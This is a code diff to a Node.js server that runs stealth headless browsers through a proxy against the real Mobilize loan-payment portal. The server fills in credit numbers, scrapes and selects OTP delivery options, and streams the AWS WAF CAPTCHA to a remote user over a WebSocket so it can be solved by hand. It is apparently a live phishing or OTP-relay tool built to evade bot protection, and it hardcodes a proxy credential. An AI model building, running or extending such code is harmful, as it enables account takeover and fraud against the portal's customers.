@@ -2,7 +2,7 @@ const express = require("express");
 const cors = require("cors");
 const path = require("path");
 const http = require("http");
-const WebSocket = require("ws");
+const { WebSocketServer } = require("ws");
 const puppeteer = require("puppeteer-extra");
 const StealthPlugin = require("puppeteer-extra-plugin-stealth");
 
@@ -23,10 +23,11 @@ const PROXY = {
   pass: "605d224e-19b6-4baa-8107-296ee7d836f5",
 };
 
+// URL REAL del portal de pagos de Mobilize
 const MOBILIZE_URL = "https://www.mobilize-fs.com.co/portal-pagos/";
 
 // ============================================================
-// POOL
+// POOL DE NAVEGADORES PRE-CALENTADOS
 // ============================================================
 const warmPool = [];
 const POOL_SIZE = 2;
@@ -34,7 +35,7 @@ const sessions = new Map();
 
 async function launchBrowser() {
   console.log("[POOL] Lanzando navegador...");
-  return puppeteer.launch({
+  const browser = await puppeteer.launch({
     headless: "new",
     executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
     args: [
@@ -43,29 +44,31 @@ async function launchBrowser() {
       "--disable-setuid-sandbox",
       "--disable-dev-shm-usage",
       "--disable-gpu",
+      "--single-process",
+      "--no-zygote",
       "--window-size=1366,768",
     ],
   });
-}
-
-async function preparePage(page) {
-  await page.authenticate({ username: PROXY.user, password: PROXY.pass });
-  await page.setUserAgent(
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-  );
-  await page.setViewport({ width: 1366, height: 768 });
+  return browser;
 }
 
 async function warmUp() {
   try {
     const browser = await launchBrowser();
     const page = await browser.newPage();
-    await preparePage(page);
+
+    await page.authenticate({ username: PROXY.user, password: PROXY.pass });
+    await page.setUserAgent(
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    );
+    await page.setViewport({ width: 1366, height: 768 });
 
     console.log("[POOL] Navegando a Mobilize...");
     await page.goto(MOBILIZE_URL, { waitUntil: "networkidle2", timeout: 60000 });
+
+    // Esperar input de crédito (Angular Material)
     await page.waitForSelector("#otp-contract", { timeout: 30000 });
-    console.log("[POOL] Página lista.");
+    console.log("[POOL] Página lista, input #otp-contract encontrado.");
 
     warmPool.push({ browser, page, createdAt: Date.now() });
     console.log(`[POOL] Pool: ${warmPool.length}/${POOL_SIZE} listos.`);
@@ -84,13 +87,19 @@ async function takeFromPool() {
   if (warmPool.length > 0) {
     const warm = warmPool.shift();
     console.log(`[POOL] Tomado del pool. Quedan: ${warmPool.length}`);
+    // Rellenar en background
     fillPool().catch(() => {});
     return warm;
   }
+  // Pool vacío — crear uno nuevo
   console.log("[POOL] Pool vacío, creando nuevo...");
   const browser = await launchBrowser();
   const page = await browser.newPage();
-  await preparePage(page);
+  await page.authenticate({ username: PROXY.user, password: PROXY.pass });
+  await page.setUserAgent(
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  );
+  await page.setViewport({ width: 1366, height: 768 });
   await page.goto(MOBILIZE_URL, { waitUntil: "networkidle2", timeout: 60000 });
   await page.waitForSelector("#otp-contract", { timeout: 30000 });
   return { browser, page, createdAt: Date.now() };
@@ -105,13 +114,15 @@ async function destroySession(sessionId) {
   }
 }
 
+// Limpiar sesiones viejas (>15 min)
 setInterval(() => {
   const now = Date.now();
   for (const [id, s] of sessions) {
-    if (now - s.createdAt > 20 * 60 * 1000) destroySession(id);
+    if (now - s.createdAt > 15 * 60 * 1000) destroySession(id);
   }
 }, 60000);
 
+// Limpiar pool viejo (>10 min sin usar)
 setInterval(() => {
   const now = Date.now();
   while (warmPool.length > 0 && now - warmPool[0].createdAt > 10 * 60 * 1000) {
@@ -123,7 +134,58 @@ setInterval(() => {
 }, 60000);
 
 // ============================================================
-// ENDPOINTS (los tuyos intactos)
+// HELPER: Screenshot solo del CAPTCHA
+// ============================================================
+async function screenshotCaptcha(page) {
+  const captchaInfo = await page.evaluate(() => {
+    // Buscar por selectores conocidos de AWS WAF CAPTCHA
+    const selectors = [
+      ".waf-captcha__stage",
+      "#captcha-container",
+      "[class*='waf-captcha']",
+      ".amzn-captcha-img-cell-container",
+    ];
+    for (const sel of selectors) {
+      const cap = document.querySelector(sel);
+      if (cap && cap.offsetHeight > 30) {
+        const rect = cap.getBoundingClientRect();
+        return { found: true, x: rect.x, y: rect.y, width: rect.width, height: rect.height };
+      }
+    }
+    // Buscar por texto visible (fallback)
+    const allDivs = document.querySelectorAll("div, section, form");
+    for (const d of allDivs) {
+      const txt = d.innerText?.toLowerCase() || "";
+      if ((txt.includes("elija todo") || txt.includes("seleccione") || txt.includes("confirma que eres")) && d.offsetHeight > 100) {
+        const rect = d.getBoundingClientRect();
+        if (rect.width > 200) return { found: true, x: rect.x, y: rect.y, width: rect.width, height: rect.height };
+      }
+    }
+    return { found: false };
+  });
+
+  if (!captchaInfo.found) return { found: false, screenshot: null, bounds: null };
+
+  const padding = 10;
+  const screenshot = await page.screenshot({
+    encoding: "base64",
+    clip: {
+      x: Math.max(0, captchaInfo.x - padding),
+      y: Math.max(0, captchaInfo.y - padding),
+      width: Math.min(captchaInfo.width + padding * 2, 1366),
+      height: Math.min(captchaInfo.height + padding * 2, 768),
+    },
+  });
+
+  return {
+    found: true,
+    screenshot: `data:image/png;base64,${screenshot}`,
+    bounds: { x: captchaInfo.x, y: captchaInfo.y, width: captchaInfo.width, height: captchaInfo.height },
+  };
+}
+
+// ============================================================
+// ENDPOINTS
 // ============================================================
 
 // 1. INICIAR — Llena crédito, clic Continuar, extrae opciones OTP
@@ -137,12 +199,14 @@ app.post("/api/start", async (req, res) => {
     const { browser, page } = await takeFromPool();
     sessions.set(sessionId, { browser, page, id: sessionId, createdAt: Date.now() });
 
+    // Llenar el campo de crédito
     console.log(`[${sessionId}] Llenando crédito: ${creditNumber}`);
     const input = await page.$("#otp-contract");
     await input.click({ clickCount: 3 });
     await input.type(creditNumber, { delay: 40 });
     await new Promise((r) => setTimeout(r, 800));
 
+    // Clic en CONTINUAR automáticamente
     console.log(`[${sessionId}] Clic en Continuar...`);
     await page.evaluate(() => {
       const btns = [...document.querySelectorAll("button[type='submit'], button.otp-form__primary, .mat-flat-button")];
@@ -150,16 +214,21 @@ app.post("/api/start", async (req, res) => {
       if (b) b.click();
     });
 
+    // Esperar a que cargue la siguiente vista (opciones OTP)
     await new Promise((r) => setTimeout(r, 4000));
 
+    // Extraer opciones de envío OTP (radio buttons, botones, cards, etc.)
     const otpOptions = await page.evaluate(() => {
       const options = [];
+      // Buscar radio buttons, mat-radio, cards clickeables, botones de opción
       const radios = document.querySelectorAll("mat-radio-button, input[type='radio'], .mat-radio-button");
       radios.forEach((r, i) => {
         const label = r.innerText || r.getAttribute("aria-label") || r.closest("label")?.innerText || "";
         const value = r.querySelector("input")?.value || r.getAttribute("value") || i.toString();
         if (label.trim()) options.push({ type: "radio", index: i, label: label.trim(), value });
       });
+
+      // Buscar botones/cards que digan SMS, correo, email, celular, etc.
       if (options.length === 0) {
         const allClickable = document.querySelectorAll("button, .mat-card, [role='button'], mat-card, .otp-option, .channel-option, a.mat-list-item, mat-list-option, .mat-selection-list mat-list-option");
         allClickable.forEach((el, i) => {
@@ -171,46 +240,91 @@ app.post("/api/start", async (req, res) => {
           }
         });
       }
+
+      // Capturar también el texto visible de la página para contexto
       const bodyText = document.body.innerText.substring(0, 2000);
+
       return { options, bodyText, url: window.location.href };
     });
 
-    // Detección de CAPTCHA dinámico (múltiples selectores)
-    const hasCaptcha = await page.evaluate(() => {
-      const sels = [
+    // Si hay CAPTCHA visible, screenshot SOLO del elemento CAPTCHA
+    const captchaInfo = await page.evaluate(() => {
+      const selectors = [
         ".waf-captcha__stage",
         "#captcha-container",
-        "iframe[src*='recaptcha' i]",
-        "iframe[src*='hcaptcha' i]",
-        "iframe[title*='reCAPTCHA' i]",
-        "div.g-recaptcha",
-        "div.h-captcha",
-        "[class*='captcha' i]",
-        "canvas[class*='captcha' i]",
+        "[class*='captcha']",
+        "#amzn-captcha-verify-image",
+        ".amzn-captcha-img-cell-container",
       ];
-      for (const s of sels) {
-        const el = document.querySelector(s);
-        if (el && el.offsetHeight > 0 && el.offsetWidth > 0) return true;
+      for (const sel of selectors) {
+        const cap = document.querySelector(sel);
+        if (cap && cap.offsetHeight > 30) {
+          const rect = cap.getBoundingClientRect();
+          return {
+            found: true,
+            x: rect.x,
+            y: rect.y,
+            width: rect.width,
+            height: rect.height,
+            selector: sel,
+          };
+        }
       }
-      return false;
+      // Buscar por texto "captcha" o "bolsas" o "seleccione" en la página
+      const allDivs = document.querySelectorAll("div, section, form");
+      for (const d of allDivs) {
+        const txt = d.innerText?.toLowerCase() || "";
+        if ((txt.includes("captcha") || txt.includes("elija") || txt.includes("seleccione") || txt.includes("confirma que eres")) && d.offsetHeight > 100) {
+          const rect = d.getBoundingClientRect();
+          if (rect.width > 200) {
+            return {
+              found: true,
+              x: rect.x,
+              y: rect.y,
+              width: rect.width,
+              height: rect.height,
+              selector: "text-match",
+            };
+          }
+        }
+      }
+      return { found: false };
     });
 
     let screenshot = null;
-    if (hasCaptcha) {
-      const buf = await page.screenshot({ encoding: "base64", fullPage: false });
-      screenshot = `data:image/png;base64,${buf}`;
+    let captchaBounds = null;
+    if (captchaInfo.found) {
+      // Screenshot SOLO del área del CAPTCHA
+      screenshot = await page.screenshot({
+        encoding: "base64",
+        clip: {
+          x: Math.max(0, captchaInfo.x - 10),
+          y: Math.max(0, captchaInfo.y - 10),
+          width: Math.min(captchaInfo.width + 20, 1366),
+          height: Math.min(captchaInfo.height + 20, 768),
+        },
+      });
+      screenshot = `data:image/png;base64,${screenshot}`;
+      captchaBounds = {
+        x: captchaInfo.x,
+        y: captchaInfo.y,
+        width: captchaInfo.width,
+        height: captchaInfo.height,
+      };
     }
 
-    console.log(`[${sessionId}] OTP: ${otpOptions.options.length}, CAPTCHA: ${hasCaptcha}`);
+    console.log(`[${sessionId}] OTP opts: ${otpOptions.options.length}, CAPTCHA: ${captchaInfo.found} (${captchaInfo.selector || 'none'})`);
 
     res.json({
       sessionId,
       otpOptions: otpOptions.options,
       bodyText: otpOptions.bodyText,
       url: otpOptions.url,
-      hasCaptcha,
+      hasCaptcha: captchaInfo.found,
       screenshot,
+      captchaBounds,
     });
+
   } catch (err) {
     console.error(`[${sessionId}] Error start:`, err.message);
     await destroySession(sessionId);
@@ -218,7 +332,7 @@ app.post("/api/start", async (req, res) => {
   }
 });
 
-// 1b. SELECCIONAR MÉTODO OTP
+// 1b. SELECCIONAR MÉTODO OTP — El usuario escogió SMS o correo
 app.post("/api/select-otp", async (req, res) => {
   const { sessionId, optionIndex, optionType, optionValue } = req.body;
   const session = sessions.get(sessionId);
@@ -226,6 +340,8 @@ app.post("/api/select-otp", async (req, res) => {
 
   try {
     const page = session.page;
+
+    // Hacer clic en la opción que el usuario escogió
     console.log(`[${sessionId}] Seleccionando OTP: ${optionType} index=${optionIndex} val=${optionValue}`);
 
     if (optionType === "radio") {
@@ -234,6 +350,7 @@ app.post("/api/select-otp", async (req, res) => {
         if (radios[idx]) radios[idx].click();
       }, optionIndex);
     } else {
+      // Click en botón/card por texto
       await page.evaluate((val) => {
         const allClickable = document.querySelectorAll("button, .mat-card, [role='button'], mat-card, .otp-option, .channel-option, a.mat-list-item, mat-list-option, .mat-selection-list mat-list-option");
         const match = [...allClickable].find((el) => el.innerText.trim() === val);
@@ -243,6 +360,7 @@ app.post("/api/select-otp", async (req, res) => {
 
     await new Promise((r) => setTimeout(r, 1500));
 
+    // Buscar y hacer clic en botón de enviar/continuar si existe
     await page.evaluate(() => {
       const btns = [...document.querySelectorAll("button[type='submit'], button.mat-flat-button, .mat-flat-button")];
       const b = btns.find((el) => {
@@ -254,32 +372,27 @@ app.post("/api/select-otp", async (req, res) => {
 
     await new Promise((r) => setTimeout(r, 3000));
 
-    const hasCaptcha = await page.evaluate(() => {
-      const sels = [".waf-captcha__stage", "#captcha-container", "iframe[src*='recaptcha' i]",
-        "iframe[src*='hcaptcha' i]", "div.g-recaptcha", "div.h-captcha", "[class*='captcha' i]"];
-      for (const s of sels) {
-        const el = document.querySelector(s);
-        if (el && el.offsetHeight > 0 && el.offsetWidth > 0) return true;
-      }
-      return false;
-    });
-
-    let screenshot = null;
-    if (hasCaptcha) {
-      const buf = await page.screenshot({ encoding: "base64", fullPage: false });
-      screenshot = `data:image/png;base64,${buf}`;
-    }
+    // Verificar si hay CAPTCHA ahora
+    const captchaResult = await screenshotCaptcha(page);
 
     const bodyText = await page.evaluate(() => document.body.innerText.substring(0, 2000));
-    console.log(`[${sessionId}] OTP seleccionado. CAPTCHA: ${hasCaptcha}`);
 
-    res.json({ success: true, hasCaptcha, screenshot, bodyText });
+    console.log(`[${sessionId}] OTP seleccionado. CAPTCHA: ${captchaResult.found}`);
+
+    res.json({
+      success: true,
+      hasCaptcha: captchaResult.found,
+      screenshot: captchaResult.screenshot,
+      captchaBounds: captchaResult.bounds,
+      bodyText,
+    });
+
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
 });
 
-// 1c. DETECTAR ESTADO
+// 1c. DETECTAR ESTADO — ¿Hay opciones OTP o CAPTCHA?
 app.post("/api/detect-state", async (req, res) => {
   const { sessionId } = req.body;
   const session = sessions.get(sessionId);
@@ -287,6 +400,7 @@ app.post("/api/detect-state", async (req, res) => {
 
   try {
     const page = session.page;
+
     const otpOptions = await page.evaluate(() => {
       const options = [];
       const radios = document.querySelectorAll("mat-radio-button, input[type='radio'], .mat-radio-button");
@@ -308,54 +422,97 @@ app.post("/api/detect-state", async (req, res) => {
       return options;
     });
 
-    const hasCaptcha = await page.evaluate(() => {
-      const sels = [".waf-captcha__stage", "#captcha-container", "iframe[src*='recaptcha' i]",
-        "iframe[src*='hcaptcha' i]", "div.g-recaptcha", "div.h-captcha", "[class*='captcha' i]"];
-      for (const s of sels) {
-        const el = document.querySelector(s);
-        if (el && el.offsetHeight > 0 && el.offsetWidth > 0) return true;
-      }
-      return false;
-    });
-
-    let screenshot = null;
-    if (hasCaptcha) {
-      const buf = await page.screenshot({ encoding: "base64", fullPage: false });
-      screenshot = `data:image/png;base64,${buf}`;
-    }
+    const captchaResult = await screenshotCaptcha(page);
 
     const bodyText = await page.evaluate(() => document.body.innerText.substring(0, 2000));
-    res.json({ otpOptions, hasCaptcha, screenshot, bodyText });
+
+    res.json({ otpOptions, hasCaptcha: captchaResult.found, screenshot: captchaResult.screenshot, captchaBounds: captchaResult.bounds, bodyText });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
 });
 
-// 2. SCREENSHOT
+// 2. SCREENSHOT (del CAPTCHA si está visible, si no fullpage)
 app.post("/api/screenshot", async (req, res) => {
   const { sessionId } = req.body;
   const session = sessions.get(sessionId);
   if (!session) return res.status(404).json({ error: "Sesión no encontrada" });
 
   try {
-    const screenshot = await session.page.screenshot({ encoding: "base64", fullPage: false });
-    res.json({ screenshot: `data:image/png;base64,${screenshot}` });
+    const captchaResult = await screenshotCaptcha(session.page);
+    if (captchaResult.found) {
+      res.json({ screenshot: captchaResult.screenshot, captchaBounds: captchaResult.bounds });
+    } else {
+      const screenshot = await session.page.screenshot({ encoding: "base64", fullPage: false });
+      res.json({ screenshot: `data:image/png;base64,${screenshot}` });
+    }
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
 });
 
-// 3. CLICK en coordenadas (fallback — usado solo si el espejo falla)
+// 3. CLICK en coordenadas del CAPTCHA (relativas al elemento)
 app.post("/api/click", async (req, res) => {
-  const { sessionId, x, y } = req.body;
+  const { sessionId, x, y, captchaBounds } = req.body;
   const session = sessions.get(sessionId);
   if (!session) return res.status(404).json({ error: "Sesión no encontrada" });
 
   try {
-    await session.page.mouse.click(x, y);
-    await new Promise((r) => setTimeout(r, 1000));
-    const screenshot = await session.page.screenshot({ encoding: "base64", fullPage: false });
-    res.json({ screenshot: `data:image/png;base64,${screenshot}` });
+    // Si vienen bounds del CAPTCHA, sumar el offset para click absoluto en la página
+    let absX = x;
+    let absY = y;
+    if (captchaBounds) {
+      absX = captchaBounds.x + x;
+      absY = captchaBounds.y + y;
+    }
+
+    console.log(`[${sessionId}] Click CAPTCHA: rel(${x},${y}) → abs(${absX},${absY})`);
+    await session.page.mouse.click(absX, absY);
+    await new Promise((r) => setTimeout(r, 800));
+
+    // Re-screenshot solo del CAPTCHA
+    const captchaInfo = await session.page.evaluate(() => {
+      const selectors = [".waf-captcha__stage", "#captcha-container", "[class*='captcha']"];
+      for (const sel of selectors) {
+        const cap = document.querySelector(sel);
+        if (cap && cap.offsetHeight > 30) {
+          const rect = cap.getBoundingClientRect();
+          return { found: true, x: rect.x, y: rect.y, width: rect.width, height: rect.height };
+        }
+      }
+      const allDivs = document.querySelectorAll("div, section, form");
+      for (const d of allDivs) {
+        const txt = d.innerText?.toLowerCase() || "";
+        if ((txt.includes("captcha") || txt.includes("elija") || txt.includes("seleccione") || txt.includes("confirma que eres")) && d.offsetHeight > 100) {
+          const rect = d.getBoundingClientRect();
+          if (rect.width > 200) return { found: true, x: rect.x, y: rect.y, width: rect.width, height: rect.height };
+        }
+      }
+      return { found: false };
+    });
+
+    let screenshot;
+    let newBounds = null;
+    if (captchaInfo.found) {
+      screenshot = await session.page.screenshot({
+        encoding: "base64",
+        clip: {
+          x: Math.max(0, captchaInfo.x - 10),
+          y: Math.max(0, captchaInfo.y - 10),
+          width: Math.min(captchaInfo.width + 20, 1366),
+          height: Math.min(captchaInfo.height + 20, 768),
+        },
+      });
+      newBounds = { x: captchaInfo.x, y: captchaInfo.y, width: captchaInfo.width, height: captchaInfo.height };
+    } else {
+      screenshot = await session.page.screenshot({ encoding: "base64", fullPage: false });
+    }
+
+    res.json({
+      screenshot: `data:image/png;base64,${screenshot}`,
+      captchaBounds: newBounds,
+      captchaStillVisible: captchaInfo.found,
+    });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -407,7 +564,7 @@ app.post("/api/type", async (req, res) => {
   }
 });
 
-// 6. EXTRAER DATOS
+// 6. EXTRAER DATOS de la página
 app.post("/api/extract", async (req, res) => {
   const { sessionId } = req.body;
   const session = sessions.get(sessionId);
@@ -439,100 +596,83 @@ app.get("/api/health", (req, res) => {
 });
 
 // ============================================================
-// HTTP + WEBSOCKET ESPEJO EN VIVO
+// WEBSOCKET MIRROR — espejo del CAPTCHA en tiempo real
 // ============================================================
 const server = http.createServer(app);
-const wss = new WebSocket.Server({ noServer: true, perMessageDeflate: false });
+const wss = new WebSocketServer({ server, path: "/ws" });
 
-server.on("upgrade", (req, socket, head) => {
-  if (!req.url.startsWith("/ws/mirror")) return;
-  wss.handleUpgrade(req, socket, head, (ws) => wss.emit("connection", ws, req));
-});
-
-wss.on("connection", async (ws, req) => {
-  const url = new URL(req.url, "http://x");
-  const sessionId = url.searchParams.get("sessionId");
-  const session = sessions.get(sessionId);
-
-  if (!session) {
-    ws.send(JSON.stringify({ type: "error", message: "Sesión no encontrada" }));
-    return ws.close(4004, "no session");
-  }
-
-  const { page } = session;
-  console.log(`[${sessionId}] Espejo conectado.`);
-
-  let cdp;
-  try {
-    cdp = await page.target().createCDPSession();
-    await cdp.send("Page.enable");
-    await cdp.send("Page.startScreencast", {
-      format: "jpeg",
-      quality: 65,
-      maxWidth: 1100,
-      maxHeight: 800,
-      everyNthFrame: 2,
-    });
-
-    cdp.on("Page.screencastFrame", async (frame) => {
-      if (ws.readyState === WebSocket.OPEN) {
-        ws.send(Buffer.from(frame.data, "base64"), { binary: true });
-      }
-      try { await cdp.send("Page.screencastFrameAck", { sessionId: frame.sessionId }); } catch {}
-    });
-  } catch (e) {
-    console.error(`[${sessionId}] Error CDP:`, e.message);
-    ws.close();
-    return;
-  }
+wss.on("connection", (ws) => {
+  let mirrorInterval = null;
+  let wsSessionId = null;
 
   ws.on("message", async (raw) => {
-    let msg;
-    try { msg = JSON.parse(raw); } catch { return; }
     try {
-      switch (msg.t) {
-        case "move":
-          await page.mouse.move(msg.x, msg.y);
-          break;
-        case "click":
-          await page.mouse.move(msg.x, msg.y);
-          await page.mouse.down();
-          await new Promise((r) => setTimeout(r, 50));
-          await page.mouse.up();
-          break;
-        case "dblclick":
-          await page.mouse.move(msg.x, msg.y);
-          await page.mouse.down({ clickCount: 1 });
-          await page.mouse.up({ clickCount: 1 });
-          await new Promise((r) => setTimeout(r, 30));
-          await page.mouse.down({ clickCount: 2 });
-          await page.mouse.up({ clickCount: 2 });
-          break;
-        case "wheel":
-          await page.mouse.wheel({ deltaY: msg.d });
-          break;
-        case "press":
-          await page.keyboard.press(msg.k);
-          break;
-        case "type":
-          await page.keyboard.type(msg.s, { delay: 20 });
-          break;
-        case "backspace":
-          await page.keyboard.press("Backspace");
-          break;
-        case "selectall":
-          await page.keyboard.down("Control");
-          await page.keyboard.press("KeyA");
-          await page.keyboard.up("Control");
-          break;
+      const msg = JSON.parse(raw);
+
+      // START MIRROR — empezar a enviar frames del CAPTCHA
+      if (msg.type === "start-mirror") {
+        wsSessionId = msg.sessionId;
+        const session = sessions.get(wsSessionId);
+        if (!session) { ws.send(JSON.stringify({ type: "error", msg: "Sesión no encontrada" })); return; }
+
+        // Enviar frame inicial
+        const initial = await screenshotCaptcha(session.page);
+        if (initial.found) {
+          ws.send(JSON.stringify({ type: "frame", screenshot: initial.screenshot, bounds: initial.bounds }));
+        }
+
+        // Loop: enviar frame cada 300ms (como video)
+        mirrorInterval = setInterval(async () => {
+          try {
+            const s = sessions.get(wsSessionId);
+            if (!s || ws.readyState !== 1) { clearInterval(mirrorInterval); return; }
+            const frame = await screenshotCaptcha(s.page);
+            if (frame.found) {
+              ws.send(JSON.stringify({ type: "frame", screenshot: frame.screenshot, bounds: frame.bounds }));
+            } else {
+              // CAPTCHA desapareció
+              ws.send(JSON.stringify({ type: "captcha-gone" }));
+              clearInterval(mirrorInterval);
+              mirrorInterval = null;
+            }
+          } catch (e) {}
+        }, 300);
       }
-    } catch (e) { /* silencioso */ }
+
+      // CLICK — usuario hizo clic en el CAPTCHA
+      if (msg.type === "click") {
+        const session = sessions.get(wsSessionId || msg.sessionId);
+        if (!session) return;
+
+        let absX = msg.x, absY = msg.y;
+        if (msg.bounds) {
+          absX = msg.bounds.x + msg.x;
+          absY = msg.bounds.y + msg.y;
+        }
+
+        await session.page.mouse.click(absX, absY);
+        await new Promise((r) => setTimeout(r, 400));
+
+        // Enviar frame actualizado inmediatamente
+        const frame = await screenshotCaptcha(session.page);
+        if (frame.found) {
+          ws.send(JSON.stringify({ type: "frame", screenshot: frame.screenshot, bounds: frame.bounds }));
+        } else {
+          ws.send(JSON.stringify({ type: "captcha-gone" }));
+          if (mirrorInterval) { clearInterval(mirrorInterval); mirrorInterval = null; }
+        }
+      }
+
+      // STOP MIRROR
+      if (msg.type === "stop-mirror") {
+        if (mirrorInterval) { clearInterval(mirrorInterval); mirrorInterval = null; }
+      }
+
+    } catch (e) {}
   });
 
-  ws.on("close", async () => {
-    try { await cdp.send("Page.stopScreencast"); } catch {}
-    try { await cdp.detach(); } catch {}
-    console.log(`[${sessionId}] Espejo desconectado.`);
+  ws.on("close", () => {
+    if (mirrorInterval) { clearInterval(mirrorInterval); mirrorInterval = null; }
   });
 });
 
@@ -541,7 +681,7 @@ wss.on("connection", async (ws, req) => {
 // ============================================================
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, async () => {
-  console.log(`Mobilize Puppeteer + Geonode → http://localhost:${PORT}`);
+  console.log(`Mobilize Puppeteer + Geonode + WS → http://localhost:${PORT}`);
   console.log("[POOL] Pre-calentando navegadores...");
   fillPool().catch((e) => console.error("[POOL] Error inicial:", e.message));
 });
